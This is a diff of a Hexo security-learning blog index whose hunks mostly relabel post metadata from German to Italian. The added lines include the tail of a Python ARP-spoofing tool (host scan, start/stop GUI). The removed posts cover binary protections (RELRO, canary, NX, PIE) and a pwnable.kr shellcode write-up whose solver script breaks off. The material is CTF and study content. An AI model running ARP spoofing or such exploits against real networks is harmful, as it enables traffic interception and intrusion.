ip_lists:</span><br><span class="line">        print(<span class="string">'ip地址：'</span>+ip+<span class="string">'：'</span>)</span><br><span class="line">        <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> ret[<span class="string">'scan'</span>]:</span><br><span class="line">            temp_ip_lists.append(ip)</span><br><span class="line">            print(<span class="string">'扫描超时'</span>)</span><br><span class="line">        <span class="keyword">else</span>:print(<span class="string">'已扫描到主机，主机名：'</span>+ret[<span class="string">'scan'</span>][ip][<span class="string">'hostnames'</span>][<span class="number">0</span>][<span class="string">'name'</span>])</span><br><span class="line">    print(str(hosts) +<span class="string">' 网络中的存活主机:'</span>)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> temp_ip_lists:ip_lists.remove(ip)</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ip_lists:</span><br><span class="line">        m+=ip+<span class="string">'\n'</span></span><br><span class="line">    a.msgbox(msg=m , title= <span class="string">'ARP欺骗'</span>, ok_button=<span class="string">'start'</span>, image=<span class="keyword">None</span>, root=<span class="keyword">None</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<h2 id="end-py"><a href="#end-py" class="headerlink" title="end.py"></a>end.py</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import easygui</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">cc =easygui.ccbox(msg=&apos;点击finish结束攻击&apos;, title=&apos;ARP欺骗 &apos;, choices=(&apos;continue&apos;, &apos;finish&apos;), image=None)</span><br><span class="line"></span><br><span class="line">if cc==0:</span><br><span class="line">        os.system(r&quot;echo 1 &gt; /root/桌面/ARP欺骗/flag.txt&quot;)</span><br></pre></td></tr></table></figure>
+<h2 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt"></a>flag.txt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>
+<p>flag这个文件里写1还是0都可以。因为每次程序运行都会初始化一遍。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/08/28/ubuntu相关配置/"/>
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lh"/>
+      <meta itemprop="description" content=""/>
+      <meta itemprop="image" content="/images/avatar.gif"/>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo"/>
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/08/28/ubuntu相关配置/" class="post-title-link" itemprop="url">ubuntu相关配置</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Scritto il</span>
+              
+
+              
+                
+              
+
+              <time title="Post creato: 2019-08-28 17:26:38 / Post modificato: 17:27:17" itemprop="dateCreated datePublished" datetime="2019-08-28T17:26:38+08:00">2019-08-28</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><a href="https://blog.csdn.net/weixin_42108484/article/details/82698877" target="_blank" rel="noopener">Ubuntu18.04的网络配置</a></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
     
       
 
@@ -391,14 +709,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-08-25 15:18:06" itemprop="dateCreated datePublished" datetime="2019-08-25T15:18:06+08:00">2019-08-25</time>
+              <time title="Post creato: 2019-08-25 15:18:06" itemprop="dateCreated datePublished" datetime="2019-08-25T15:18:06+08:00">2019-08-25</time>
             
 
             
@@ -415,7 +733,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-10-15 20:16:24" itemprop="dateModified" datetime="2019-10-15T20:16:24+08:00">2019-10-15</time>
+                <time title="Post modificato: 2019-10-15 20:16:24" itemprop="dateModified" datetime="2019-10-15T20:16:24+08:00">2019-10-15</time>
               
             
           </span>
@@ -429,7 +747,7 @@
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -587,14 +905,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-08-25 15:16:37" itemprop="dateCreated datePublished" datetime="2019-08-25T15:16:37+08:00">2019-08-25</time>
+              <time title="Post creato: 2019-08-25 15:16:37" itemprop="dateCreated datePublished" datetime="2019-08-25T15:16:37+08:00">2019-08-25</time>
             
 
             
@@ -706,7 +1024,7 @@
           <h1 class="post-title" itemprop="name headline">
                 
                 
-                <a href="/2019/08/17/攻防世界-新手/" class="post-title-link" itemprop="url">Unbenannt</a>
+                <a href="/2019/08/17/攻防世界-新手/" class="post-title-link" itemprop="url">Senza titolo</a>
               
             
           </h1>
@@ -724,14 +1042,14 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-08-17 15:56:32" itemprop="dateCreated datePublished" datetime="2019-08-17T15:56:32+08:00">2019-08-17</time>
+              <time title="Post creato: 2019-08-17 15:56:32" itemprop="dateCreated datePublished" datetime="2019-08-17T15:56:32+08:00">2019-08-17</time>
             
 
             
@@ -748,7 +1066,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-22 17:11:56" itemprop="dateModified" datetime="2019-08-22T17:11:56+08:00">2019-08-22</time>
+                <time title="Post modificato: 2019-08-22 17:11:56" itemprop="dateModified" datetime="2019-08-22T17:11:56+08:00">2019-08-22</time>
               
             
           </span>
@@ -2179,14 +2497,14 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-08-17 15:08:23" itemprop="dateCreated datePublished" datetime="2019-08-17T15:08:23+08:00">2019-08-17</time>
+              <time title="Post creato: 2019-08-17 15:08:23" itemprop="dateCreated datePublished" datetime="2019-08-17T15:08:23+08:00">2019-08-17</time>
             
 
             
@@ -2203,7 +2521,7 @@ exp：<br>
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-09-29 20:07:48" itemprop="dateModified" datetime="2019-09-29T20:07:48+08:00">2019-09-29</time>
+                <time title="Post modificato: 2019-09-29 20:07:48" itemprop="dateModified" datetime="2019-09-29T20:07:48+08:00">2019-09-29</time>
               
             
           </span>
@@ -2217,7 +2535,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2418,14 +2736,14 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-08-14 21:15:24 / Updated at: 21:39:56" itemprop="dateCreated datePublished" datetime="2019-08-14T21:15:24+08:00">2019-08-14</time>
+              <time title="Post creato: 2019-08-14 21:15:24 / Post modificato: 21:39:56" itemprop="dateCreated datePublished" datetime="2019-08-14T21:15:24+08:00">2019-08-14</time>
             
 
             
@@ -2444,7 +2762,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2597,14 +2915,14 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-08-05 23:41:13" itemprop="dateCreated datePublished" datetime="2019-08-05T23:41:13+08:00">2019-08-05</time>
+              <time title="Post creato: 2019-08-05 23:41:13" itemprop="dateCreated datePublished" datetime="2019-08-05T23:41:13+08:00">2019-08-05</time>
             
 
             
@@ -2621,7 +2939,7 @@ exp：<br>
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-06 20:49:37" itemprop="dateModified" datetime="2019-08-06T20:49:37+08:00">2019-08-06</time>
+                <time title="Post modificato: 2019-08-06 20:49:37" itemprop="dateModified" datetime="2019-08-06T20:49:37+08:00">2019-08-06</time>
               
             
           </span>
@@ -2761,14 +3079,14 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-07-23 00:00:00" itemprop="dateCreated datePublished" datetime="2019-07-23T00:00:00+08:00">2019-07-23</time>
+              <time title="Post creato: 2019-07-23 00:00:00" itemprop="dateCreated datePublished" datetime="2019-07-23T00:00:00+08:00">2019-07-23</time>
             
 
             
@@ -2785,7 +3103,7 @@ exp：<br>
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-08-17 17:06:29" itemprop="dateModified" datetime="2019-08-17T17:06:29+08:00">2019-08-17</time>
+                <time title="Post modificato: 2019-08-17 17:06:29" itemprop="dateModified" datetime="2019-08-17T17:06:29+08:00">2019-08-17</time>
               
             
           </span>
@@ -2799,7 +3117,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -2950,14 +3268,14 @@ exp：<br>
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Veröffentlicht am</span>
+                <span class="post-meta-item-text">Scritto il</span>
               
 
               
                 
               
 
-              <time title="Post created: 2019-07-13 23:34:45" itemprop="dateCreated datePublished" datetime="2019-07-13T23:34:45+08:00">2019-07-13</time>
+              <time title="Post creato: 2019-07-13 23:34:45" itemprop="dateCreated datePublished" datetime="2019-07-13T23:34:45+08:00">2019-07-13</time>
             
 
             
@@ -2974,7 +3292,7 @@ exp：<br>
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Updated at: 2019-07-14 00:05:06" itemprop="dateModified" datetime="2019-07-14T00:05:06+08:00">2019-07-14</time>
+                <time title="Post modificato: 2019-07-14 00:05:06" itemprop="dateModified" datetime="2019-07-14T00:05:06+08:00">2019-07-14</time>
               
             
           </span>
@@ -2988,7 +3306,7 @@ exp：<br>
                 <i class="fa fa-folder-o"></i>
               </span>
               
-                <span class="post-meta-item-text">in</span>
+                <span class="post-meta-item-text">In</span>
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
@@ -3077,365 +3395,6 @@ exp：<br>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/05/14/pwn入门/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/14/pwn入门/" class="post-title-link" itemprop="url">pwn入门（脚本检测与各类防护技术）</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-05-14 09:03:11" itemprop="dateCreated datePublished" datetime="2019-05-14T09:03:11+08:00">2019-05-14</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-07-13 23:35:48" itemprop="dateModified" datetime="2019-07-13T23:35:48+08:00">2019-07-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="脚本检测与各类防护技术"><a href="#脚本检测与各类防护技术" class="headerlink" title="脚本检测与各类防护技术"></a>脚本检测与各类防护技术</h2><p>使用checksec，</p>
-<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO:"></a>RELRO:</h3><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域，尽量减少可写的存储区域可使安全系数提高。GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术Relocation Read Only, 重定向只读，实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读。（参考RELRO技术细节）</p>
-<h3 id="Stack-栈溢出检查，"><a href="#Stack-栈溢出检查，" class="headerlink" title="Stack: 栈溢出检查，"></a>Stack: 栈溢出检查，</h3><p>用Canary金丝雀值是否变化来检测,Canary found表示开启。<br>金丝雀最早指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。这里是一种缓冲区溢出攻击缓解手段：启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux将cookie信息称为Canary。</p>
-<h3 id="NX-No-Execute，栈不可执行，"><a href="#NX-No-Execute，栈不可执行，" class="headerlink" title="NX: No Execute，栈不可执行，"></a>NX: No Execute，栈不可执行，</h3><p>也就是windows上的DEP。<br><img src="/2019/05/14/pwn入门/check1.webp" alt=""></p>
-<p> 分析缓冲区溢出攻击，其根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，就目前来看重新去设计计算机体系结构基本上是不可能的，我们只能靠向前兼容的修补来减少溢出带来的损害，DEP就是用来弥补计算机对数据和代码混淆这一天然缺陷的。</p>
-<p>DEP的基本原理是<strong>将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</strong>DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。硬件DEP需要CPU的支持，AMD和Intel都为此做了设计，AMD称之为No-Execute Page-Protection（NX），Intel称之为Execute Disable Bit（XD）<br>Linux称为 NX 与 DEP原理相同</p>
-<h3 id="PIE-位置无关"><a href="#PIE-位置无关" class="headerlink" title="PIE: 位置无关"></a>PIE: 位置无关</h3><p>position-independent executables, 位置无关的可执行文件，也就是常说的<strong>ASLR(Address space layout randomization) 地址随机化</strong>，<strong>程序每次启动基址都随机</strong>。</p>
-<p>作者：SueLyon<br>链接：<a href="https://www.jianshu.com/p/6e528b33e37a" target="_blank" rel="noopener">https://www.jianshu.com/p/6e528b33e37a</a><br>来源：简书<br>简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://betterlh.github.io/2019/05/07/pwnable-kr8-asm/"/>
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lh"/>
-      <meta itemprop="description" content=""/>
-      <meta itemprop="image" content="/images/avatar.gif"/>
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo"/>
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/05/07/pwnable-kr8-asm/" class="post-title-link" itemprop="url">pwnable-asm</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-
-              
-                
-              
-
-              <time title="Post created: 2019-05-07 14:30:18" itemprop="dateCreated datePublished" datetime="2019-05-07T14:30:18+08:00">2019-05-07</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Updated at: 2019-05-13 21:25:14" itemprop="dateModified" datetime="2019-05-13T21:25:14+08:00">2019-05-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>代码asm.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        seccomp_release(ctx);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">    read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">10</span>);</span><br><span class="line">    chroot(<span class="string">"/home/asm_pwn"</span>);    <span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">    sandbox();</span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>在这里学到可以用pwntools下的disasm函数打开：<br>stub: “\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff”</p>
-<p><img src="/2019/05/07/pwnable-kr8-asm/1.JPG" alt=""><br>dec是 自减操作 相当于c语言中的i–<br>xor表示异或 0xor0=0  0xor1=1 1xor0=1 1xor1=0<br>xor ax，ax  是常见的寄存器清零操作。<br>上面这个即把所有寄存器清零，对写shellcode没影响。<br>再来回顾一下源代码，先用setvbuf设置了一下写入写出的缓冲区，然后为sh分配了0x1000的内存空间并初始化，而且将上边的shellcode拷贝到sh，然后read函数让我们向sh之后的空间内传入自己的shellcode。    </p>
-<p>好像直接写shell code就可以了，题目考察的就是shellcode<br>代码含义，启动沙盒模式，只可使用open，write，read三个函数，构造shellcodeopenflag文件，然后用read读出来，再write到stdout即可<br><img src="/2019/05/07/pwnable-kr8-asm/1.JPG" alt=""></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">con = ssh(host='pwnable.kr', user='asm', password='guest', port=2222)</span><br><span class="line">p = con.connect_remote('localhost', 9026)</span><br><span class="line"></span><br><span class="line">context(os='linux', arch='amd64')</span><br><span class="line">shellcode = <span class="string">""</span></span><br><span class="line">shellcode += 